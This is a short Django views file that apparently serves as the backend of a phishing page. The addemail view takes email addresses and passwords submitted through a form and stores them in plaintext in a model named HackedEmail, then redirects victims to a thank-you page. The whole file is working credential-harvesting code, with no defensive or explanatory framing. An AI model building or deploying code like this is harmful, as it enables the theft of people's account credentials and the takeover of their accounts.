from django.shortcuts import render

from django.http import HttpResponse
from django.shortcuts import redirect
from .models import HackedEmail
# Create your views here.
def thanks(request):
    template="thanks.html"
    return render(request,template)

def index(request):
    template="index.html"
    return render(request,template)    

def addemail(request):
    if(request.method == 'POST'):
        email=request.POST['email']
        password=request.POST['pass']
        emailobj=HackedEmail(user_email=email,passchar=password)
        
        emailobj.save();

        return redirect('/thanks')

    else:
        return render(request,'index.html')    